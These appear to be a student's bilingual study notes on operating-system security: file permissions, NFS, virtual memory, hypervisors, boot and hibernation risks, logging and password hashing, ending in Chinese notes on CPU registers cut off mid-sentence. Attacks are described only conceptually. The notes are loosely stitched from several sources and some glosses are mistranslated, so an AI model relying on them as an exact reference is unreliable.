Distributed Information Systems (distributed naming services) such as LDAP, DNS, NIS, Active Directory implement unified access to information needed for remote computing
File Sharing – Failure Modes
All file systems have failure modes
example corruption of directory structures or other
non-user data, called metadata
Remote file systems add new failure modes, due to
network failure, server failure
Recovery from failure can involve state information about status of each remote request
Stateless protocols such as NFS v3 include all information in each request, allowing easy recovery but less security
File Sharing – Consistency Semantics
Specify how multiple users are to access a shared file simultaneously
Similar to Ch 5 process synchronization algorithms Tend to be less complex due to disk I/O and network latency (for remote file systems
Andrew File System (AFS) implemented complex remote file sharing semantics
Unix file system (UFS) implements:
Writes to an open file visible immediately to other
users of the same open file
Sharing file pointer to allow multiple users to read
and write concurrently AFS has session semantics
Writes only visible to sessions starting after the file is closed
Protection
File owner/creator should be able to control: what can be done
by whom
Types of access
Read Write Execute Append Delete List
Access Lists and Groups Mode of access: read, write, execute Three classes of users on Unix / Linux
a) owner access 7
b) group access 6
c) public access 1
Ask manager to create a group (unique name), say G, and
add some users to the group.
For a particular file (say game) or subdirectory, define an appropriate access.
Attach a group to a file
chgrp G game
Windows 7 Access-Control List Management
RWX ⇒ 111 RWX ⇒ 110
RWX ⇒ 001
  A Sample UNIX Directory Listing
 network file system
 - TCP for v4, UDP for v3
- Server,
  - v4:
  - TCP/2049 (limited RPC)
  - nfs-server   - v3:
  - dynamically allocated ports
  - RPC over UDP
  - Rpcbind server: manages RPC port reservations and connections   - consolidated resources.
  - keep all of our resources in a nice, tightly-controlled package.
  - one place to backup, secure, ensure control performance - provide a location for collaboration.
- home directories.   - By default, Unix and Linux systems create home directories on the local file systems of users' computers.
  - challenging for several reasons, backups, user portability
  - NFS place the home directories on a centralized file server
and users' data can be accessed more easily from varying computers in our corporate environment.
- web content
  - hundreds of web servers, and updating the content on each of
them individually can be very challenging.
  - place the web content on a collection of centralized, high
performance file servers, and then share that content back out and mount those sharers on the web servers.
- benefits: updating the content only on the file servers rather than having to update that content on the many many web or application servers in our web farm. This can be very convenient and very well performing if designed correctly.
Exports: shared resources, /etc/exports 1.4 Memory Management
Another service that an operating system provides is memory management
the organization and allocation of the memory in a computer. When a process executes, it is allocated a region of memory, address
space.
stores the program code, data, and storage the process needs during
execution.
In the Unix memory model, which is used for most PCs, the address space is organized into five segments (from low addresses to high)
1. Text:
  - contains the actual machine code of the program
  - compiled from source code prior to execution.
2. Data:   - contains static program variables that have been initialized in the source code, prior to execution.
3. BSS (block started by symbol):
  - contains static variables that are uninitialized (or initialized
to zero). 4. Heap:
  - known as the dynamic segment,
  - stores data generated during the execution of a process,
  - Like: objects created dynamically in an object-oriented program written in Java or C++.
5. Stack 堆积 :
  - houses a stack data structure that grows downwards and is used for keeping track of the call structure of subroutines (e.g., methods in Java and functions in C) and their arguments.  ⁃
Memory Access Permissions
Each of the five memory segments has its own set of access permissions (readable, writable, executable), and these permissions are enforced by the operating system.
The text region is usually read-only, because it is generally not desirable to allow the alteration of a program’s code during its execution.
All other regions are writable, because their contents may be altered during a program’s execution.
An essential rule of operating systems security is that processes are not allowed to access the address space of other processes, unless they have explicitly requested to share some of that address space with each other.
If this rule were not enforced, then processes could alter the execution and data of other processes, unless some sort of process-based access control system were put in place.
Enforcing address space boundaries avoids many serious security problems by protecting processes from changes by other processes.
In addition to the segmentation of address space in order to adhere to the Unix memory model, operating systems divide the address space into two broad regions:
user space, where all user-level applications run,
kernel space, which is a special area reserved for core operating
system functionality.
  - Typically, the operating system reserves a set amount of space (like one gigabyte) at the bottom of each process’s address space, for the kernel, which naturally has some of the most restrictive access privileges of the entire memory.
Contiguous Address Spaces
each process’s address space is a contiguous block of memory. Arrays are indexed as contiguous memory blocks, like, so if a program uses a large array, it needs an address space for its data that is contiguous.
In fact, even the text portion of the address space, which is used for the computer code itself, should be contiguous, to allow for a program to include instructions such as “jump forward 10 instructions,” which is a natural type of instruction in machine code.
But give each executing process a contiguous slab of real memory would be highly inefficient and impossible.
example, if the total amount of contiguous address space is more than the amount of memory in the computer, then it is simply not possible for all executing processes to get a contiguous region of memory the size of its address space.
Virtual Memory
Even if all the processes had address spaces that could fit in memory, there would still be problems.
Idle 闲置停顿的 processes in such a scenario would still retain their respective chunks of memory
if enough processes were running, memory would be needlessly scarce.
To solve these problems, most computer architectures incorporate a system of virtual memory:
processes are allowed to act as if their memory is contiguous (in reality it may be fragmented and spread across RAM)
  - each process receives a virtual address space, and each virtual address is mapped to an address in real memory by the virtual memory system. memory management unit looks up the real address that it is mapped to and facilitates access.
  - This is useful, as it allows for several simplifications, such as supporting applications that index into large arrays as contiguous chunks of memory.
⁃
Allow the total size of the address spaces of executing processes to be larger than the actual main memory of the computer.
  - Extend the memory: the virtual memory system can use a portion of the external drive to “park” blocks of memory when they are not being used by executing processes.
  - allows for a computer to execute a set of processes to be multitasked, which had to keep their entire address spaces in main memory all the time.
 freeing applications from having to manage a shared memory space, increased security due to memory isolation.
Less I/O required, leads to faster and easy swapping of processes.
More physical memory available, as programs are stored on virtual memory, occupy very less space on actual physical memory .
Page Faults
There is a slight time trade-off for benefit we get from virtual memory:
accessing the hard drive is much slower, 10,000 times slower than RAM (accessing main memory)
So OS use the hard drive to store blocks of memory that are not currently needed, in order to have most memory accesses being in main memory, not the hard drive.
Page fault: when a block of the address space is not accessed for an extended period of time, it may be paged out and written to disk. When a process attempts to access a virtual address that resides in a paged out block.
When a page fault occurs, paging supervisor (another portion of the virtual memory system) finds the desired memory block on the hard drive, reads it back into RAM,
  - updates the mapping between the physical and virtual addresses,
  - possibly pages out a different unused memory block.
  - This mechanism allows the OS to manage scenarios where the total memory required by running processes is greater than the amount of RAM available.  ⁃
1.5 Virtual Machines
Virtualization Technology (VT) - Intel’s CPU design for security and performance enhancements that enable the BIOS to support virtualization
Virtualization Machine Extensions (VMX) - instruction sets created for Intel processors to handle virtualization
Virtual machine technology: allows an OS to run without direct contact with its underlying hardware.
For instance, such systems may allow for substantial electrical power savings, by combining the activities of several computer systems into one, with the one simulating the operating systems of the others.
OS is run inside a virtual machine (VM), software that creates a simulated environment the OS can interact with.
The software layer that provides this environment: hypervisor or virtual machine monitor (VMM).
The OS running in the VM is known as a guest, the native OS is known as the host.
native virtualization: Alternately, the hypervisor can run directly in hardware without a host OS.
To the guest OS, everything appears normal: it can interact with external devices, perform I/O, and so on.
  - the OS is in fact interacting with virtual devices,
  - and the underlying virtual machine bridge these virtual devices and
the actual hardware, completely transparent to the guest OS.
The software that runs virtual machines is called a “hypervisor” Two types of hypervisor:
Type 1 hypervisor - loads on physical hardware and doesn’t require a separate OS
  - typically loaded on servers or workstations with a lot of RAM and
storage.
  - Can be installed on a VM for testing purposes.
  - Capability is limited only by the amount of available RAM, storage,
and throughput.
  - Common type 1 hypervisors:
  - VMware vSphere
  - Microsoft Hyper-V 2012
  - Citrix XenServer
  - IBM PowerVM
  - Parallels Bare Metal
Type 2 hypervisor - rests on top of an existing OS
  - usually the ones you find loaded on a suspect machine.   - Most widely used type 2 hypervisors:
  - Parallels Desktop: created for Macintosh users who also use
Windows applications
  - KVM (Kernel-based Virtual Machine): for Linux OS
  - Microsoft Virtual PC: the most recent version supports only
VMs that run Windows
  - VMware Workstation and Player: can be installed on almost
any device, including tablets
⁃
  - VirtualBox: supports all Windows and Linux OSs (like
Macintosh, Solaris)
⁃
Allows selecting types associated with other applications, such as VMware VMDK type or the Parallels HDD type
  - Can install Microsoft Hyper-V Server on it
  - Can support up to 16 CPUs, 8 TB storage, and 20 VM
Implementing Virtual Machines
2 main implementations 执行 of VMs. The first emulation 竞争:
  - the host OS simulates virtual interfaces that the guest OS interacts 1,136

with.
  - Communications through these interfaces are translated on the host
system and eventually passed to the hardware.
  - Benefit: allows more hardware flexibility.
  - supports one processor on a machine running an entirely different processor.
  - Downside: it typically has decreased performance 性能 due to the conversion process for the communication between the virtual and real hardware.
The second virtualization, and removes the above conversion process.
As a result, the virtual interfaces within the VM must be matched with the actual hardware on the host machine, so communications are passed from one to the other seamlessly.
  - reduces the possibilities for running exotic 外来的 guest OS
  - results in a significant performance boost.
Advantages of Virtualization
Hardware Efficiency.
Virtualization allows system administrators to host multiple OS on the same
machine, ensuring an efficient allocation of hardware resources.
hypervisor is responsible for effectively managing the interactions between each OS and the underlying hardware, and for ensuring that these concurrent operations are both efficient and safe.
This management may be very complex—one set of hardware may be forced to manage many operating systems simultaneously. Portability.
the ability to run a program on multiple different machines.
the entire guest OS is running as software virtually, so it is possible to save the entire state of the guest OS as a snapshot and transfer it to another machine.
also allows easy restoration in the event of a problem.
  - example:
  - malware researchers frequently employ VM technology to study malware samples in an environment,
  - can easily be restored to a clean state should anything go awry. Security.
By containing the OS in a virtual environment, the VM functions as a strict sandbox, protects the rest of the machine in the event that the guest OS is compromised.
In the event of a breach, it is a simple matter to disconnect a virtual machine from the Internet without interrupting the operations of other services on the host machine.
Management Convenience.
the ability to take snapshots of the entire virtual machine state can prove very convenient.
Example:
  - Bob, a user on a company network, is running a virtualized version of Windows that boots automatically when he turns on his machine.
  - If Bob’s OS becomes infected with malware,
  - then a system administrator could just log in to the host operating system, disconnect Bob from the company network, and create a snapshot of Bob’s virtual machine state.
  - After reviewing the snapshot on another machine, the administrator might decide to revert Bob’s machine to a clean state taken previously.
The whole process would be reasonably time consuming and resource intensive on ordinary machines, but VM technology makes it relatively simple. 3.2 Process Security
2.1 Inductive Trust from Start to Finish
The trust that we place on the processes running on a computer is an inductive belief based on the integrity of the processes that are loaded when the computer is turned on, and that this state is maintained even if the computer is shut down or put into a hibernation state.
The Boot Sequence
booting/bootstrapping: loading an OS into memory from a powered-off state
initially, all of the OS’s code is stored in persistent storage, typically the hard drive.
However, in order to execute the OS, it must be loaded into memory. When a computer is turned on, it first executes code stored in a
firmware component BIOS (basic input/output system).
On modern systems, the BIOS loads into memory the second-stage boot loader, which handles loading the rest of the OS into memory and then passes control of execution to the OS.  A malicious user could seize 夺取 execution of a computer at several points in the boot process.
To prevent an attacker from initiating the first stages of booting, many computers feature a BIOS password that does not allow a second- stage boot loader to be executed without authentication. There are some other security issues related to the boot sequence, however. Most second-stage boot loaders allow the user to specify which device should be used to load the rest of the operating system.
In most cases, this option defaults to booting from the hard drive, or in the event of a new installation, from external media such as a DVD drive.
one should make sure that the operating system is always booted from trusted media.
There is a customizable hierarchy that determines the order of precedence of booting devices:
the first available device in the list is used for booting.
This flexibility is important for installation and troubleshooting
purposes
but it could allowan attacker with physical access to boot another operating system from an external media, by passing the security mechanisms built into the OS intended to be run on the computer.
To prevent these attacks, many computers utilize second-stage boot loaders that feature password protections that only allow authorized users to boot from external storage media.
Hibernation
Modern machines have the ability to go into a powered-off state, hibernation 冬眠.
While going into hibernation, the OS stores the entire contents of the machine’s memory into a hibernation file on disk, so that the state of the computer can be quickly restored when the system is powered back on. Without additional security precautions 预防措施, hibernation exposes machine to potentially invasive forensic investigation.
Since the entire contents of memory are stored into the hibernation file (any passwords or sensitive information were stored in memory at the time of hibernation are preserved)
A live CD attack can be performed to gain access to the hibernation file.
Windows stores the hibernation file as C:\hiberfil.sys.
Security researchers have shown the feasibility 可行性 of reversing the compression algorithm used in this file, to extract a viewable snapshot of RAM at the time of hibernation, which opens the possibility of the attack.
Attacks that modify the hiberfil.sys file have also been demonstrated 显 示, so that the execution of programs on the machine is altered when the machine is powered on.
 Windows does not delete the hibernation file after resuming execution, so it may persist even after the computer is rebooted several times.
A related attack on virtual memory page files, or swap files, is discussed in Section 3.1. To defend against these attacks, hard disk encryption should be used to protect hibernation files and swap files.
2.2 Monitoring, Management, and Logging
One of the most important aspects of operating systems security is something military people call “situational awareness.”
Keeping track of what processes are running,
what other machines have interacted with the system via the Internet,
if the operating system has experienced any unexpected or suspicious behavior can often leave important clues not only for troubleshooting ordinary problems, but also for determining the cause of a security breach.
example, noticing log entries of repeated failed attempts to log in may warn of a brute-force attack, and prompt a system administrator to change passwords to ensure safety.
Event Logging
OS built-in systems for managing event logging.
Windows includes an event logging system, Windows Event Log.
Windows defines 3 possible sources of logs: System, Application, Security .
System log can only be written to by the OS itself
Application log may be written to by ordinary applications.
Security log can only be written to by a special Windows service known as the Local Security Authority Subsystem Service, visible in Process Explorer as lsass.exe.
This service is responsible for enforcing security policies such as access control and user authentication.
In addition to 3 predefined sources, users can define their own log sources.
Each log entry is an event. Events are given unique identifiers, which correspond to any of the potential occurrences on a Windows machine that prompt logging.
Examples include applications exiting unexpectedly, users failing to properly authenticate, network connections being made, and so on.
Unix-based systems, including Linux, have differing logging mechanisms depending on the specific distribution.
Typically, log files are stored in /var/log or some similar location are simple text files with descriptive names. example
  - auth.log: contains records of user authentication
  - kern.log: keeps track of unexpected kernel behavior.
  - Like Windows logs, entries contain a timestamp along with a description of the event.
  - Typically, writing to these log files can only be done by a special syslog daemon. While Windows log files may allow easier handling when using Microsoft’s event logging tools, the simple text format of Unix logs, containing one event per line, allows quick and easy perusing.
Process Monitoring
There are several scenarios where we would like to find out exactly which processes are currently running on our computer.
we may like to terminate the misbehaving execution or malicious process, but doing so requires that we identify it first.
Every operating system therefore provides tools that allow users to monitor and manage currently running processes.
the task manager application in Windows
the ps, top, pstree, and kill commands in Linux.
Process Explorer
Process monitoring tools: present a detailed listing of running processes and associated execution statistics. Process Explorer:
a highly customizable and useful tool for monitoring processes in Windows.
The tool bar of Process Explorer contains various buttons, including one for terminating processes.
The mini graphs show the usage histories of CPU time, main memory, and I/O, useful for identifying malicious or misbehaving processes.
The left column (Process) displays the tree of processes, the processes and their parent-child relationship, by means of a standard outline view.
Next to the process name has icon, helps to facilitate visual identification.
The remaining columns display, from left to right, the process ID (PID), percentage of CPU time used (CPU), size (in KB) of the process address space (Virtual Size), and description of the process (Description).
Large usage of CPU time and/or address space often indicate problematic processes that may need to be terminated.
background color of processes: different colors are used to highlight: newly started processes, processes being terminated, user processes (started by the same user running Process Explorer), and system processes, such as services.
All of these features provide a useful graphical user interface for identifying malicious and misbehaving processes, as well as giving a simple means to kill them once they are identified.
In addition to monitoring performance, it is important to gather detailed information about the process image, the executable program associated with the process. In our example of Figure 11, Process Explorer provides the name of the entity that has developed the program (Company) and the location on disk of the image (Path).
The location of the image may allow the detection of a virus whose file name is the same as that of a legitimate application but is located in a nonstandard directory.
An attacker may also try to replace the image of a legitimate program with a modified version that performs malicious actions.
To counter this attack, the software developer can digitally sign the image and Process Explorer can be used to verify the signature and display the name of the entity who has signed the image (Verified Signer). 3.3 Memory and Filesystem Security
3.1 Virtual Memory Security
virtual memory is a useful tool for OS, allows multiple processes with a total address space larger than our RAM memory to run effectively, supports these multiple processes to each view its address spaces as being contiguous.
Even so, these features come with some security concerns.
Windows page file, Linux Swap Files
Windows, virtual memory pages that have been written to the hard disk are actually contained in the page file, located at C:\pagefile.sys.
Linux, typically requires users to set up an entire partition of their hard disk, known as the swap partition, to contain these memory pages.
Linux supports a swap file, similarly to the Windows page file.
In all cases, each OS enforce rules preventing users from viewing the contents of virtual memory files while the OS is running, and it may be configured such that they are deleted when the machine is shut down.
Attacks on Virtual Memory
Protection is the capability for the hardware to prevent a program from accessing another program's memory except under very carefully controlled conditions.
An unauthorized access to memory not owned by a particular program causes an interrupt. The interrupt causes the operating system to shut down or reset the offending task. This provides a security measure to prevent an ill-behaved program from demolishing摧毁 other programs.
The memory protection function is often performed by an separate chip that is managed by the operating system. There is nothing in stack machines that prevents this kind of chip from being used. An advantage of stack machines in this area is that they are small enough to allow the possibility of on-chip memory protection circuitry for increased system integration levels.
If an attacker suddenly powered off the machine without properly shutting down and booted to another OS via external media, it may be possible to view these files and reconstruct portions of memory, potentially exposing sensitive information.
To mitigate these risks, hard disk encryption should be used in all cases where potentially untrusted parties have physical access to a machine.
encryption does not stop attacker from reading a swap file, since he would have physical access to the computer.
But it does prevent attacker from geting the contents of files, he don’t have the decryption keys.
3.3.2 Password-Based Authentication
central question of operating systems security:
How does the operating system securely identify its users?
The answer to this question is in the authentication concept, the determination of the identity or role that someone has (with respect to the resources the operating system controls). A standard authentication mechanism used by most operating systems: Users log in by username + password.
System accepts this authentication and logs the users into the system.
Instead of storing the passwords as clear text, operating systems typically keep cryptographic one-way hashes of the passwords in a password file/database.
Because of the cryptographic hash functions, attacker who gets the password file cannot efficiently derive from it the actual passwords and has to resort to a guessing attack.
guessing attack: the basic approach to guess passwords from password file is to dictionary attack:
  - each word in dictionary is hashed
  - Compare the resulting value with the hashed passwords
stored in the password file.
  - If users of a system use weak passwords, like English names and words, the dictionary attack can often succeed with a dictionary of only 500,000 words, as opposed to the search space of over 5 quadrillion words that could be formed from eight characters.
Password Salt
One way to make the dictionary attack more difficult is to use salt, a cryptographic technique of adding random bits in the input to a hash function/encryption algorithm so as to increase the randomness in the output.
For password authentication, salt is associate a random number with each userid.
Instead of comparing the hash of an entered password with a stored hash of a password
the system compares the hash of an entered password and the salt for
the associated userid with a stored hash of (password+salt). U = userid, P = corresponding password, S = salt for U, H =
cryptographic hash function. When using salt: the password file: triplet (U, S, h(S||P)),
 Salt Increases Search Space Size
Using password salt significantly increases the search space for dictionary attack.
Assuming attacker cannot find the salt associated with a userid, the search space for a dictionary attack on a salted password is of size:
2B × D
B=the number of bits of the random salt
D=the size of the list of words for the dictionary attack.
example:
a system uses a 32-bit salt for each userid and its users pick passwords from 500,000 word dictionary, the search space for attacking salted passwords would be:
232 × 500,000 = 2,147,483,648,000,000, over 2 quadrillion.
Also, even if an attacker can find the salt associated with each userid (the system should store it in encrypted form), by employing salted passwords, an operating system can limit his dictionary attack to one userid at a time (since he would have to use a different salt value for each one).
Password Authentication in Windows and Unix-based Systems
In Windows systems, password hashes are stored in Security Accounts Manager (SAM) file (not accessible to regular users while the OS is running)
Older versions of Windows, stored hashed passwords in this file using LAN Manager hash (LM hash) (has security weaknesses)
LM hash: password-hashing algorithm based on DES, pads a user’s password to 14 characters, converts all lowercase letters to uppercase, uses each of the 7-byte halves to generate a DES key.
These two DES keys are used to encrypt a stored string (such as “KGS!@#$%”), resulting in two 8-byte ciphertexts, which are concatenated to form the final hash.
each half of the user’s password is treated separately, dictionary attack on an LM hash is actually easier, cause each half has a maximum of seven characters.
converting all letters to uppercase significantly reduces the search space.
Finally, the LM hash algorithm does not include a salt, so using tables of precomputed information is especially effective.
Windows improved these weaknesses by the NTLM algorithm.
a challenge-response protocol for authentication by several Windows
components.
The protocol involves a server(authenticate the user), the operating system, and a client
  - The OS sends an 8-byte random number as a challenge to the client.
  - Next, the client computes two 24-byte responses using two secrets, the LM hash of the password and the MD4 hash of the password.
  - For each secret, the client pads the 16-byte hash to 21 bytes with null characters, splits the 21 bytes into three groups of 7 bytes, and uses each 7-byte segment as a key to DES encrypt the 8-byte challenge.
  - Finally, the three 8-byte ciphertexts (for each secret) are concatenated, resulting in two 24-byte responses (one using the MD4 hash, and the other using the LM hash). performed the same computations using its stored hashes, and authenticates the user.
  - While NTLM has not been completely broken, some weaknesses have been identified. Specifically, both the MD4 and LM hashes are unsalted and as such are vulnerable to precomputation attacks.
Unix-based systems feature a similar password mechanism, and store authentication information at /etc/passwd, possibly in conjunction with /etc/shadow.
However, most Unix variants use salt and are not as restricted in the choice of hash algorithm, allowing administrators to chose their preference. most systems use a salted MD5 algorithm or a DES variant, but many are able to use other hash algorithms such as Blowfish.
3.3 Access Control and Advanced File Permissions
Once a user is authenticated to a system, the next question that must be addressed is that of access control:
To address in detail this question with respect to files, we need to develop some terminology.
A principal is either a user or a group of users.
Principal: can be defined as a set of users, such as a group, friends, consisting of users peter and paul, or it can be one of the principals predefined by the operating system.
example, in Unix-based systems, the following users and groups are defined for each file/folder. User owner refers to the user owning the file.
Group/owning group, is the default group associated with the file.
Also, group all includes all the users in the system and group other consists of all but owner, i.e., of all users except the owner of the file.
A permission is a specific action on a file or folder.
file permissions include read, write permission.
program files may additionally have an execute permission.
A folder may also have a list permission, being able to inspect (list) the contents of the folder, and execute, allows for setting the current directory as that folder.
  - The execute permission of folders is the basis for the path-based access control mechanism in Unix-based systems.
Access Control Entries and Lists
access control entry (ACE) for a file/folder consists of: principal, type, permission.
type is either allow or deny.
An access control list (ACL) is an ordered list of ACEs.
There are a number of specific implementation details that must be considered when designing an OS permissions scheme.
how do permissions interact with the file organization of the system?
is there a hierarchy of inheritance?
If a file resides in a folder, does it inherit the permissions of its parent, or override them with its own permissions?
What happens if a user has permission to write to a file but not to the directory that the file resides in?
The meaning of read, write, and execute permissions seems intuitive for files, but how do these permissions affect folders?
if permissions aren’t specifically granted or denied, are they implied by default?
Linux Permissions
Linux inherits most of its access control systems from the early Unix systems
Linux features file permission matrices, determine the privileges various users have in regards to a file.
All permissions that are not specifically granted are implicitly denied, so there is no mechanism (or need) to explicitly deny permissions.
According to the path-based access control principle, in order to access a file, each ancestor folder (in the filesystem tree) must have execute permission and the file itself must have read permission.
Finally, owners of files are given the power to change the permissions on those files, discretionary access control (DAC).
In addition to the 3 basic permissions (read, write, and execute), Linux allows users to set extended attributes for files, which are applied to all users attempting to access these files.
Example extended attributes:
making a file append-only (user may only write to the end of the file)
marking a file as “immutable 不可改变的” at which point not even the root user can delete or modify the file (unless removes the attribute first). respectively.
More recently, Linux has begun supporting an optional ACL-based permissions scheme. ACLs on Linux can be checked with the getfacl command, and set with the setfacl command.
Within this scheme, each file has basic ACEs for the owner, group, and other principals and additional ACEs for specific users or groups, called named users and named groups, can be created.
There is also a mask ACE, which specifies the maximum allowable permissions for the owning group and any named users and groups.
  - U = euid of the process attempting access to the file or folder with certain requested permissions.
  - To determine whether to grant access, the OS tries to match the following conditions and selects the ACE associated with the first matching condition:
  - U is the userid of the file owner: the ACE for owner;
  - U is one of the named users: the ACE for U;
  - one of the groups of U is the owning group and the ACE for group contains the requested permissions: the ACE for group;
  - one of the groups of U is a named group G and its ACE contains the requested permissions: the ACE for G;
  - for each group G of U that is the owning group or a named group, the ACE for G does not contain the requested permissions: the empty ACE;
  - otherwise: the ACE for other.
If the ACE for owner or other or the empty ACE has been selected, then its permissions determine access. Else, the selected ACE is “ANDed” with the mask ACE and the permissions of the resulting ACE determine access. Note that the although multiple ACEs could be selected in the fourht condition, the access decision does not depend on the specific ACE selected. At the time of this writing, Linux’s ACL scheme is not very widely used, despite the fact that it allows for more flexibility in access control.
Some Linux distributions have even more advanced access control mechanisms. Security-Enhanced Linux (SELinux), developed primarily by the United States National Security Agency, is a series of security en- hancements designed to be applied to Unix-like systems. SELinux features strictly enforced mandatory access control, which defines virtually every allowable action on a machine. Each rule consists of a subject, referring to the process attempting to gain access, an object, referring to the resource being accessed, and a series of permissions, which are checked by the operating system appropriately. SELinux embodies the principle of least privilege: limiting every process to the bare minimum permissions needed to function properly, which significantly minimizes the effects of a security breach. In addition, unlike DAC, users are not given the power to decide security attributes of their own files. Instead, this is delegated to a central security policy administrator. These enhancements allow SELinux to create a much more restrictive security environment.
Noy yet
In Chapter 5, we showed how the CPU can be shared by a set of processes.
by CPU scheduling, we can improve both the CPU utilization and the speed of the computer’s response to its users. (increase in performance). - So we must keep many processes in memory, share memory. We need ways to manage memory.
- The memory- management algorithms vary from a primitive bare- machine approach to a strategy uses paging.
- Each approach has its own advantages and disadvantages.
- Selection depends on many factors, especially on the hardware
design of the system.
- most algorithms require hardware support, many systems to have
integrated hardware + operating-system memory management.
536CN4 chapter 9.1 Background
Memory is central to the operation of computer system.
Memory consists of a large array of bytes, each with its own address.
The CPU fetches instructions from memory according to the value of the program counter.
Instructions: cause additional loading from / storing to specific memory addresses. fetches an instruction from memory.
The instruction is then decoded and may cause operands to be
fetched from memory.
The instruction has been executed on the operands.
results may be stored back in memory.
The memory unit sees only a stream of memory addresses;
  - does not know how they are generated (by the instruction counter, indexing, indirection, literal addresses, and so on)
  - does not know what they are for (instructions or data).
Accordingly, we can ignore how a program generates a memory address. We are interested only in the sequence of memory addresses generated by the running program.
We begin our discussion by covering several issues that are pertinent to managing memory: basic hardware, the binding of symbolic (or virtual) memory addresses to actual physical addresses, and the distinction between logical and physical addresses. We conclude the section with a discussion of dynamic linking and shared libraries.  在CPU中至少要有六类寄存器:指令寄存器(IR)、程 序计数器(PC)、地址寄存器(AR)、数据寄存器 (DR)、累加寄存器(AC)、程序状态字寄存器 (PSW)。
 这些寄存器用来暂存一个计算机字，其数目可以根据需要
进行扩充。
1. 数据寄存器 (Data Register，DR)/ 数据缓冲寄存 器， 的中转站，用以弥补CPU和主存、外设之间操作
速度上的差异。
  - 数据寄存器用来暂时存放由主存储器读出的一条指
   令或一个数据字;反之，当向主存存入一条指令或
   一个数据字时，也将它们暂时存放在数据寄存器
   中。
  - 数据寄存器的作用是 :
  - (1)作为CPU和主存、外围设备之间信息传送的
中转站;
  - (2)弥补CPU和主存、外围设备之间在操作速度
上的差异;
  - (3)在单累加器结构的运算器中，数据寄存器还
可兼作操作数寄存器。
2. 指令寄存器(Instruction Register，IR)
  - 用来保存当前正在执行的一条指令。当执行一条指 令时，首先把该指令从主存读取到数据寄存器中， 然后再传送至指令寄存器。
  - 指令包括操作码和地址码两个字段，为了执行指 令，必须对操作码进行测试，识别出所要求的操 作，指令译码器(Instruction Decoder，ID)就是 完成这项工作的。指令译码器对指令寄存器的操作 码部分进行译码，以产生指令所要求操作的控制电 位，并将其送到微操作控制线路上，在时序部件定     时信号的作用下，产生具体的操作控制信号。
 指令寄存器中操作码字段的输出就是指令译码器的输入。
操作码一经译码，即可向操作控制器发出具体操作的特定信
号。
3. 程序计数器
程序计数器(Program Counter，PC)用来指出下一条
指令在主存储器中的地址。
在程序执行之前，首先必须将程序的首地址，即程序第一 条指令所在主存单元的地址送入PC，因此PC的内容即是从 主存提取的第一条指令的地址。
当执行指令时，CPU能自动递增PC的内容，使其始终保 存将要执行的下一条指令的主存地址，为取下一条指令做好 准备。若为单字⻓指令，则(PC)+1àPC，若为双字⻓指 令，则(PC)+2àPC，以此类推。
但是，当遇到转移指令时，下一条指令的地址将由转移指 令的地址码字段来指定，而不是像通常的那样通过顺序递增 PC的内容来取得。  因此，程序计数器的结构应当是具有寄存信息和计数两种
功能的结构。
4. 地址寄存器
地址寄存器(Address Register，AR)用来保存CPU当
前所访问的主存单元的地址。
由于在主存和CPU之间存在操作速度上的差异，所以必 须使用地址寄存器来暂时保存主存的地址信息，直到主存的 存取操作完成为止。
当CPU和主存进行信息交换，即CPU向主存存入数据/指 令或者从主存读出数据/指令时，都要使用地址寄存器和数 据寄存器。
如果我们把外围设备与主存单元进行统一编址，那么，当 CPU和外围设备交换信息时，我们同样要使用地址寄存器 和数据寄存器。
5. 累加寄存器
累加寄存器通常简称累加器(Accumulator，AC)，是一 个通用寄存器。 累加器的功能是:当运算器的算术逻辑单元ALU执行算术 或逻辑运算时，为ALU提供一个工作区，可以为ALU暂时保 存一个操作数或运算结果。
 显然，运算器中至少要有一个累加寄存器。
6. 程序状态字寄存器
程序状态字(Program Status Word，PSW)用来表征当 前运算的状态及程序的工作方式。
程序状态字寄存器用来保存由算术/逻辑指令运行或测试 的结果所建立起来的各种条件码内容，如运算结果进/借位 标志(C)、运算结果溢出标志(O)、运算结果为零标志 (Z)、运算结果为负标志(N)、运算结果符号标志(S) 等，这些标志位通常用1位触发器来保存。
除此之外，程序状态字寄存器还用来保存中断和系统工作 状态等信息，以便CPU和系统及时了解机器运行状态和程 序运行状态。
 因此，程序状态字寄存器是一个保存各种状态条件标志的
寄存器。 --------------------- 作者:DemonHunter211 来源:CSDN
原文:https://blog.csdn.net/kwame211/article/details/ 77773621
 版权声明:本文为博主原创文章，转载请附上博文链接!
 计算机的存储层次(memory hierarchy)之中，寄存器
  (register)最快，内存其次，最慢的是硬盘。
 同样都是晶体管存储设备，为什么寄存器比内存快呢?   Mike Ash写了一篇很好的解释，非常通俗地回答了这个问 题，有助于加深对硬件的理解。下面就是我的简单翻译。 原因一:距离不同 距离不是主要因素，但是最好懂，所以放在最前面说。内 存离CPU比较远，所以要耗费更⻓的时间读取。 以3GHz的CPU为例，电流每秒钟可以振荡30亿次，每次 耗时大约为0.33纳秒。光在1纳秒的时间内，可以前进30 厘米。也就是说，在CPU的一个时钟周期内，光可以前进 10厘米。因此，如果内存距离CPU超过5厘米，就不可能 在一个时钟周期内完成数据的读取，这还没有考虑硬件的 限制和电流实际上达不到光速。相比之下，寄存器在CPU 内部，当然读起来会快一点。
    距离对于桌面电脑影响很大，对于手机影响就要小得多。
手机CPU的时钟频率比较慢(iPhone 5s为1.3GHz)，而
且手机的内存紧挨着CPU。 原因二:硬件设计不同
苹果公司新推出的iPhone 5s，CPU是A7，寄存器有6000 多位(31个64位寄存器，加上32个128位寄存器)。而 iPhone 5s的内存是1GB，约为80亿位(bit)。这意味 着，高性能、高成本、高耗电的设计可以用在寄存器上， 反正只有6000多位，而不能用在内存上。因为每个位的 成本和能耗只要增加一点点，就会被放大80亿倍。
 事实上确实如此，内存的设计相对简单，每个位就是一个
电容和一个晶体管，而寄存器的设计则完全不同，多出好
几个电子元件。并且通电以后，寄存器的晶体管一直有
 电，而内存的晶体管只有用到的才有电，没用到的就没
  电，这样有利于省电。这些设计上的因素，决定了寄存器
比内存读取速度更快。
原因三:工作方式不同
寄存器的工作方式很简单，只有两步:(1)找到相关的
位，(2)读取这些位。 内存的工作方式就要复杂得多:
(1)找到数据的指针。(指针可能存放在寄存器内，所
   以这一步就已经包括寄存器的全部工作了。)
 (2)将指针送往
内存管理单元(MMU)，由MMU将虚
           拟的内存地址翻译成实际的物理地址。
 (
3)将物理地址送往内存控制器(
memory
       controller)，由内存控制器找出该地址在哪一根内存插槽
    (bank)上。
   (
4)确定数据在哪一个内存块(chunk)上，从该块读取
     数据。
 (5)数据先送回内存控制器，再送回CPU，然后开始使
     用。
 内存的工作流程比寄存器多出许多步。每一步都会产生延
